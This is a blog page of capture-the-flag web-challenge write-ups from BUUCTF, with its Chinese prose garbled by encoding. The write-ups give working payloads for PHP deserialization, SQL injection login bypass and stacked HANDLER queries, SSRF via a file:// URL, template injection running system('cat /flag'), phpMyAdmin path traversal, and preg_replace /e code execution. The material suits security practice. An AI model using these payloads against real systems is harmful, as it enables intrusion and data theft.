<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$op</span>=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span>=<span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>=<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ–¹æ³•äºŒï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span> = <span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span> = <span class="string">&quot;2&quot;</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="variable">$b</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å˜é‡å±æ€§æ˜¯protectedï¼Œå®ƒåœ¨åºåˆ—åŒ–åä¼šå‡ºç°ä¸å¯è§å­—ç¬¦%00*%00ï¼Œå¯ä»¥åœ¨å˜é‡å‰è¾“å…¥\00*\00</p>
<h1 id="GXYCTF2019-BabySQli1"><a href="#GXYCTF2019-BabySQli1" class="headerlink" title="[GXYCTF2019]BabySQli1"></a>[GXYCTF2019]BabySQli1</h1><h2 id="ä¸‡èƒ½å¯†ç "><a href="#ä¸‡èƒ½å¯†ç " class="headerlink" title="ä¸‡èƒ½å¯†ç "></a>ä¸‡èƒ½å¯†ç </h2><p>username:adminâ€™ or â€˜1â€™=â€™1â€™#</p>
<p>1â€™union select 1,2,3#&amp;pw=3  è¯•å®Œä¹‹åè¯´wrong passï¼ŒæŸ¥çœ‹æºç ä¹‹åçŸ¥é“</p>
<h2 id="base32åŠ å¯†"><a href="#base32åŠ å¯†" class="headerlink" title="base32åŠ å¯†"></a>base32<strong>åŠ å¯†</strong></h2><p>MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5</p>
<p>c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw==</p>
<p>select * from user where username = â€˜$nameâ€™</p>
<p>å¯¹$nameæ³¨å…¥æ²¡æœ‰é—®é¢˜ï¼Œåå°å‚¨å­˜å¯†ç ä¸€èˆ¬æ˜¯ä»¥md5çš„æ–¹å¼è¿›è¡ŒåŠ å¯†</p>
<p>1.-1â€˜union select 1,2,3#&amp;pw=3</p>
<p>æç¤ºwrong user</p>
<p>2.-1â€™union select 1,â€™adminâ€™,3#pw=3</p>
<p>wrong pass</p>
<p>3.1â€™union select 1,â€™adminâ€™,â€™eccbc87e4b5ce2fe28308fd9f2a7baf3â€™#&amp;pw=3</p>
<p>id,admin,password</p>
<p>æç¤ºå¯†ç é”™è¯¯ï¼Œè€Œåå°ä¸€èˆ¬ä»¥md5çš„æ–¹å¼å­˜å¯†ç ï¼Œ123456åŠ å¯†åè¾“å…¥å³å¯</p>
<p>ç¬¬ä¸‰ä¾‹ä¸ºå¯†ç ï¼Œå› æ­¤è¦é‡‡ç”¨</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">6</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;flag&quot;</span></span><br><span class="line">  [<span class="number">1</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">12</span>) <span class="string">&quot;varchar(100)&quot;</span></span><br><span class="line">  [<span class="number">2</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">2</span>) <span class="string">&quot;NO&quot;</span></span><br><span class="line">  [<span class="number">3</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">0</span>) <span class="string">&quot;&quot;</span></span><br><span class="line">  [<span class="number">4</span>]=&gt;</span><br><span class="line">  <span class="literal">NULL</span></span><br><span class="line">  [<span class="number">5</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">0</span>) <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>flagå¯èƒ½å­˜åœ¨è¿™ä¸ªè¡¨é‡Œé¢ï¼Œä½†æ˜¯selectä¸setã€alterç­‰ä¼—å¤šå…³é”®è¯éƒ½è¢«é»‘åå•æ‰äº†ï¼Œè¿™é‡Œè¦åˆ©ç”¨HANDLER</p>
<p>é€šè¿‡HANDLER tbl_name OPENæ‰“å¼€ä¸€å¼ è¡¨ï¼Œæ— è¿”å›ç»“æœï¼Œå®é™…ä¸Šæˆ‘ä»¬åœ¨è¿™é‡Œå£°æ˜äº†ä¸€ä¸ªåä¸ºtb1_nameçš„å¥æŸ„ã€‚</p>
<p>é€šè¿‡HANDLER tbl_name READ FIRSTè·å–å¥æŸ„çš„ç¬¬ä¸€è¡Œï¼Œé€šè¿‡READ NEXTä¾æ¬¡è·å–å…¶å®ƒè¡Œã€‚æœ€åä¸€è¡Œæ‰§è¡Œä¹‹åå†æ‰§è¡ŒNEXTä¼šè¿”å›ä¸€ä¸ªç©ºçš„ç»“æœã€‚</p>
<p>é€šè¿‡HANDLER tbl_name CLOSEæ¥å…³é—­æ‰“å¼€çš„å¥æŸ„ã€‚</p>
<p>HANDLERçš„è¯¦ç»†ä½¿ç”¨æ–¹æ³•</p>
<p>3.æœ€ç»ˆpayload<br>1â€™;handler FlagHere open;handler FlagHere read first;Handler FlagHere close;#<br>1<br>è·å¾—flag</p>
<h1 id="ç½‘é¼æ¯-2018-Fakebook1"><a href="#ç½‘é¼æ¯-2018-Fakebook1" class="headerlink" title="[ç½‘é¼æ¯ 2018]Fakebook1"></a>[ç½‘é¼æ¯ 2018]Fakebook1</h1><p>å…ˆå°è¯•äº†ç™»å½•ï¼Œæ²¡æœ‰ç™»ä¸Šå»ï¼Œäºæ˜¯æ³¨å†Œäº†ä¸€ä¸ªï¼Œåœ¨é¡µé¢ä¸­æ²¡æœ‰æ‰¾åˆ°æ³¨å…¥ç‚¹ï¼Œçœ‹äº†wpçŸ¥é“ï¼Œè¦å–„äºè§‚å¯Ÿurl,id=1ä¾¿æ˜¯æ³¨å…¥ç‚¹ï¼Œ</p>
<p>id=1 order by 4#   å¾—å‡ºåˆ—æ•°ä¸º4</p>
<p>id=1 union/**/select 1,2,3,4#   zæ³¨å…¥ç‚¹åœ¨äºŒçš„ä½ç½®ä¸Š</p>
<p>ç„¶åæ­£å¸¸è”åˆæ³¨å…¥èµ°</p>
<p><a href="http://dac18e7d-40ea-457c-8f23-e285a3e999e3.node4.buuoj.cn:81/view.php?no=-1">http://dac18e7d-40ea-457c-8f23-e285a3e999e3.node4.buuoj.cn:81/view.php?no=-1</a> union/**/select 1,2,3,â€™O:8:â€UserInfoâ€:3:{s:4:â€nameâ€;s:5:â€adminâ€;s:3:â€ageâ€;i:18;s:4:â€blogâ€;s:29:â€file:///var/www/html/flag.phpâ€;}â€™</p>
<p>ç¬¬å››åˆ—å¼‚å¸¸ï¼Œåº”è¯¥æ˜¯æ³¨å…¥ç‚¹</p>
<h1 id="BUUCTF-2018-Online-Tool1-escapeshellarg-å’Œ-escapeshellcmd"><a href="#BUUCTF-2018-Online-Tool1-escapeshellarg-å’Œ-escapeshellcmd" class="headerlink" title="[BUUCTF 2018]Online Tool1 escapeshellarg å’Œ escapeshellcmd"></a>[BUUCTF 2018]Online Tool1 escapeshellarg å’Œ escapeshellcmd</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$host</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="variable">$host</span> = escapeshellarg(<span class="variable">$host</span>);</span><br><span class="line">    <span class="comment">//escapeshellarg</span></span><br><span class="line">    <span class="comment">//1,ç¡®ä¿ç”¨æˆ·å€¼ä¼ é€’ä¸€ä¸ªå‚æ•°ç»™å‘½ä»¤</span></span><br><span class="line">    <span class="comment">//2,ç”¨æˆ·ä¸èƒ½æŒ‡å®šæ›´å¤šçš„å‚æ•°</span></span><br><span class="line">    <span class="comment">//3,ç”¨æˆ·ä¸èƒ½æ‰§è¡Œä¸åŒçš„å‘½ä»¤</span></span><br><span class="line">    <span class="variable">$host</span> = escapeshellcmd(<span class="variable">$host</span>);</span><br><span class="line">    <span class="comment">//escapeshellcmd</span></span><br><span class="line">    <span class="comment">//1,ç¡®ä¿ç”¨æˆ·åªæ‰§è¡Œä¸€ä¸ªå‘½ä»¤</span></span><br><span class="line">    <span class="comment">//2,ç”¨æˆ·å¯ä»¥æŒ‡å®šä¸é™æ•°é‡çš„å‚æ•°</span></span><br><span class="line">    <span class="comment">//3,ç”¨æˆ·ä¸èƒ½æ‰§è¡Œä¸åŒçš„å‘½ä»¤</span></span><br><span class="line">    <span class="variable">$sandbox</span> = md5(<span class="string">&quot;glzjin&quot;</span>. <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.<span class="variable">$sandbox</span>;</span><br><span class="line">    @mkdir(<span class="variable">$sandbox</span>);</span><br><span class="line">    chdir(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="variable">$host</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\&#x27;</span><br><span class="line">&#x27;&#x27;\&#x27;&#x27;</span><br></pre></td></tr></table></figure>

<p>å‚è€ƒæ–‡ç« ï¼š[<a href="https://www.cnblogs.com/Cl0ud/p/12192230.html">BUUCTF 2018]Online Tool - æ˜¥å‘Šé³¥ - åšå®¢å›­ (cnblogs.com)</a></p>
<h1 id="BJDCTF2020-The-mystery-of-ip1-XFF"><a href="#BJDCTF2020-The-mystery-of-ip1-XFF" class="headerlink" title="[BJDCTF2020]The mystery of ip1  XFF"></a>[BJDCTF2020]The mystery of ip1  XFF</h1><p>client-ip: {7*7}</p>
<p>clien-ip: {system(â€˜cat /flagâ€™)}</p>
<h1 id="GYCTF2020-Blacklist1"><a href="#GYCTF2020-Blacklist1" class="headerlink" title="[GYCTF2020]Blacklist1"></a>[GYCTF2020]Blacklist1</h1><p>å †å æ³¨å…¥</p>
<p><a href="http://b87d8e8a-6b1d-48e3-9aa9-e8c44adb77ab.node3.buuoj.cn/?inject=1&#39;;handler">http://b87d8e8a-6b1d-48e3-9aa9-e8c44adb77ab.node3.buuoj.cn/?inject=1&#39;;handler</a> FlagHere open;handler FlagHere read first;handler FlagHere close;#</p>
<p>mysqlé™¤å¯ä½¿ç”¨selectæŸ¥è¯¢è¡¨ä¸­çš„æ•°æ®ï¼Œä¹Ÿå¯ä½¿ç”¨handlerè¯­å¥ï¼Œè¿™æ¡è¯­å¥ä½¿æˆ‘ä»¬èƒ½å¤Ÿä¸€è¡Œä¸€è¡Œçš„æµè§ˆä¸€ä¸ªè¡¨ä¸­çš„æ•°æ®ï¼Œä¸è¿‡handlerè¯­å¥å¹¶ä¸å…·å¤‡selectè¯­å¥çš„æ‰€æœ‰åŠŸèƒ½ã€‚å®ƒæ˜¯mysqlä¸“ç”¨çš„è¯­å¥ï¼Œå¹¶æ²¡æœ‰åŒ…å«åˆ°SQLæ ‡å‡†ä¸­ã€‚<br>HANDLERè¯­å¥æä¾›é€šå¾€è¡¨çš„ç›´æ¥é€šé“çš„å­˜å‚¨å¼•æ“æ¥å£ï¼Œå¯ä»¥ç”¨äºMyISAMå’ŒInnoDBè¡¨ã€‚</p>
<p>åŸºæœ¬è¯­æ³•ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HANDLER tbl_name OPEN [ [AS] alias]</span><br><span class="line"> </span><br><span class="line">HANDLER tbl_name READ index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ &#123; FIRST | NEXT &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line"> </span><br><span class="line">HANDLER tbl_name CLOSE</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>é€šè¿‡HANDLER tbl_name OPENæ‰“å¼€ä¸€å¼ è¡¨ï¼Œæ— è¿”å›ç»“æœï¼Œå®é™…ä¸Šæˆ‘ä»¬åœ¨è¿™é‡Œå£°æ˜äº†ä¸€ä¸ªåä¸ºtb1_nameçš„å¥æŸ„ã€‚<br>é€šè¿‡HANDLER tbl_name READ FIRSTè·å–å¥æŸ„çš„ç¬¬ä¸€è¡Œï¼Œé€šè¿‡READ NEXTä¾æ¬¡è·å–å…¶å®ƒè¡Œã€‚æœ€åä¸€è¡Œæ‰§è¡Œä¹‹åå†æ‰§è¡ŒNEXTä¼šè¿”å›ä¸€ä¸ªç©ºçš„ç»“æœã€‚<br>é€šè¿‡HANDLER tbl_name CLOSEæ¥å…³é—­æ‰“å¼€çš„å¥æŸ„ã€‚</p>
<p>é€šè¿‡ç´¢å¼•å»æŸ¥çœ‹çš„è¯å¯ä»¥æŒ‰ç…§ä¸€å®šçš„é¡ºåºï¼Œè·å–è¡¨ä¸­çš„æ•°æ®ã€‚<br>é€šè¿‡HANDLER tbl_name READ index_name FIRSTï¼Œè·å–å¥æŸ„ç¬¬ä¸€è¡Œï¼ˆç´¢å¼•æœ€å°çš„ä¸€è¡Œï¼‰ï¼ŒNEXTè·å–ä¸‹ä¸€è¡Œï¼ŒPREVè·å–å‰ä¸€è¡Œï¼ŒLASTè·å–æœ€åä¸€è¡Œï¼ˆç´¢å¼•æœ€å¤§çš„ä¸€è¡Œï¼‰ã€‚</p>
<p>é€šè¿‡ç´¢å¼•åˆ—æŒ‡å®šä¸€ä¸ªå€¼ï¼Œå¯ä»¥æŒ‡å®šä»å“ªä¸€è¡Œå¼€å§‹ã€‚<br>é€šè¿‡HANDLER tbl_name READ index_name = valueï¼ŒæŒ‡å®šä»å“ªä¸€è¡Œå¼€å§‹ï¼Œé€šè¿‡NEXTç»§ç»­æµè§ˆã€‚</p>
<hr>
<p>ç‰ˆæƒå£°æ˜ï¼šæœ¬æ–‡ä¸ºCSDNåšä¸»ã€Œæ— ç‹¬æœ‰å¶oã€çš„åŸåˆ›æ–‡ç« ï¼Œéµå¾ªCC 4.0 BY-SAç‰ˆæƒåè®®ï¼Œè½¬è½½è¯·é™„ä¸ŠåŸæ–‡å‡ºå¤„é“¾æ¥åŠæœ¬å£°æ˜ã€‚<br>åŸæ–‡é“¾æ¥ï¼š<a href="https://blog.csdn.net/weixin_44477223/article/details/115285538">https://blog.csdn.net/weixin_44477223/article/details/115285538</a></p>
<h1 id="GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“1"><a href="#GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“1" class="headerlink" title="[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“1"></a>[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“1</h1><p>å…ˆç”¨dirsearchæ‰«æï¼Œå‘ç°phpadmin,ä¸ç”¨ç™»é™†ç›´æ¥è¿›å…¥äº†ï¼Œç„¶åæŸ¥çœ‹ç‰ˆæœ¬ï¼Œç½‘ä¸Šæœè¿™ä¸ªç‰ˆæœ¬çš„æ¼æ´ï¼Œå¦å¤–æŸ¥çœ‹index.phpæ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?target=db_sql.php?/../../../../../../../../flag</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$goto_whitelist</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;db_datadict.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_sql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_events.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_export.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_importdocsql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_multi_table_query.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_structure.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_import.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_operations.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_search.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_routines.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;export.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;import.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;index.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;pdf_pages.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;pdf_schema.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_binlog.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_collations.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_databases.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_engines.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_export.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_import.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_privileges.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_sql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status_advisor.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status_monitor.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status_queries.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status_variables.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_variables.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;sql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_addfield.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_change.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_create.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_import.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_indexes.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_sql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_export.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_operations.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_structure.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_relation.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_replace.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_row_action.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_select.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_zoom_select.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;transformation_overview.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;transformation_wrapper.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;user_password.php&#x27;</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤1"><a href="#BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤1" class="headerlink" title="[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤1"></a>[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤1</h1><h2 id="preg-replace-â€˜-â€˜-re-â€˜-eiâ€™-â€˜strtolower-â€œ-1â€-â€™-str"><a href="#preg-replace-â€˜-â€˜-re-â€˜-eiâ€™-â€˜strtolower-â€œ-1â€-â€™-str" class="headerlink" title="preg_replace( â€˜/(â€˜ . $re . â€˜)/eiâ€™, â€˜strtolower(â€œ\1â€)â€™,$str     )"></a>preg_replace( â€˜/(â€˜ . $re . â€˜)/eiâ€™, â€˜strtolower(â€œ\1â€)â€™,$str     )</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;I have a dream&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>åŒæ—¶æ–‡ä»¶å†™å…¥å’Œæ–‡ä»¶è¯»å–</p>
<p>?text=data://text/plain,I%20have%20a%20dream&amp;file=php://filter/convert.base64-encode/resource=next.php</p>
<p>ç„¶åbase64è§£ç ï¼Œå¾—åˆ°</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complex(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>preg_replace( â€˜/(â€˜ . $re . â€˜)/eiâ€™, â€˜strtolower(â€œ\1â€)â€™,$str)</p>
<p>æˆ‘ä»¬å…ˆçœ‹ç¬¬äºŒä¸ªå‚æ•°ä¸­çš„\1 ï¼Œ\1å®é™…ä¸Šå°±æ˜¯ \1ï¼Œè€Œ \1 åœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­æœ‰è‡ªå·±çš„å«ä¹‰</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åå‘å¼•ç”¨</span><br><span class="line">å¯¹ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼æˆ–éƒ¨åˆ†æ¨¡å¼ ä¸¤è¾¹æ·»åŠ åœ†æ‹¬å· å°†å¯¼è‡´ç›¸å…³ åŒ¹é…å­˜å‚¨åˆ°ä¸€ä¸ªä¸´æ—¶ç¼“å†²åŒº ä¸­ï¼Œ</span><br><span class="line">æ‰€æ•è·çš„æ¯ä¸ªå­åŒ¹é…éƒ½æŒ‰ç…§åœ¨æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼ä¸­ä»å·¦åˆ°å³å‡ºç°çš„é¡ºåºå­˜å‚¨ã€‚</span><br><span class="line">ç¼“å†²åŒºç¼–å·ä» 1 å¼€å§‹ï¼Œæœ€å¤šå¯å­˜å‚¨ 99 ä¸ªæ•è·çš„å­è¡¨è¾¾å¼ã€‚æ¯ä¸ªç¼“å†²åŒºéƒ½å¯ä»¥ä½¿ç”¨ &#x27;\n&#x27; è®¿é—®ï¼Œ</span><br><span class="line">å…¶ä¸­ n ä¸ºä¸€ä¸ªæ ‡è¯†ç‰¹å®šç¼“å†²åŒºçš„ä¸€ä½æˆ–ä¸¤ä½åè¿›åˆ¶æ•°ã€‚</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://782b0190-5c38-4b54-8eb7-bd142a799980.node3.buuoj.cn/next.php?\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#x27;cat /flag&#x27;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.cnblogs.com/HelloCTF/p/13184476.html">preg_replaceå‡½æ•°/e æ¨¡å¼ä¸‹çš„ä»£ç æ‰§è¡Œ+ä¸€é“ä¾‹é¢˜ - Hel10 - åšå®¢å›­ (cnblogs.com)</a></p>
<p>[(44æ¡æ¶ˆæ¯) <a href="https://blog.csdn.net/RABCDXB/article/details/115363699">BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤_Sk1yçš„åšå®¢-CSDNåšå®¢</a></p>
